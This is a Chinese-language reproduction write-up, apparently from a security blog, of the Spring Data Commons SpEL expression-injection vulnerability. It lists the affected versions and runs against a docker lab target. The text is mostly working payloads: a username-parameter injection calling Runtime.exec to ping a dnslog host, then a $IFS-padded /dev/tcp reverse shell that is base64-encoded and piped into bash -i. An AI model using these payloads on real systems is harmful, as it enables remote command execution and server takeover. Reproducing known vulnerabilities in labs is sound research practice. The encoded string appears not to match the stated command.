### **漏洞简介：**

Spring Data 是一个简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data
下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞。

###  **影响版本：**

    
    
    Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)
    Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)
    Spring Data Commons 2.0 - 2.0.5 (Kay SR5)
    Spring Data REST 3.0 - 3.0.5 (Kay SR5)
    

### **复现操作：**

使用docker环境 dockerfile地址：<https://github.com/laoa1573/vuldockerfile>

验证漏洞是否存在：

访问靶场的users目录

![1635821629_6180a83df1788ff7b4d69.png!small?1635821626068](https://image.3001.net/images/20211102/1635821629_6180a83df1788ff7b4d69.png!small?1635821626068)

抓包后替换payload 执行命令ping dnslog：

    
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping carlhf.dnslog.cn")]=&password=&repeatedPassword=

返回500状态，dnslog有回显说明命令执行成功：![1635822262_6180aab6a554599b483d0.png!small?1635822259090](https://image.3001.net/images/20211102/1635822262_6180aab6a554599b483d0.png!small?1635822259090)

![1635822335_6180aaff416008ff8175b.png!small?1635822331287](https://image.3001.net/images/20211102/1635822335_6180aaff416008ff8175b.png!small?1635822331287)

现在来反弹shell，这里有个坑点是 Java Runtime.exe() 执行命令与反弹shell
要进行编码，java管道符无效的原因无法反弹，而且要使用`IFS`内部域分隔符，对空白处进行填充，不然也是反弹不回来的：

    
    
    bash$IFS$9-i>&/dev/tcp/XXXXXX/port<&1 

在bash 编码平台base64编码：<http://www.jackson-t.ca/runtime-exec-payloads.html>  
![1635822896_6180ad305cda1caebed01.png!small?1635822892539](https://image.3001.net/images/20211102/1635822896_6180ad305cda1caebed01.png!small?1635822892539)

替换paylaod、成功反弹shell：

    
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {echo,YmFzaCRJRlMkOS1pPiYvZGV2L3R2PCYx}|{base64,-d}|{bash,-i}")]=&password=&repeatedPassword=

![1635824487_6180b3678529812bbf8eb.png!small?1635824483542](https://image.3001.net/images/20211102/1635824487_6180b3678529812bbf8eb.png!small?1635824483542)

  

  

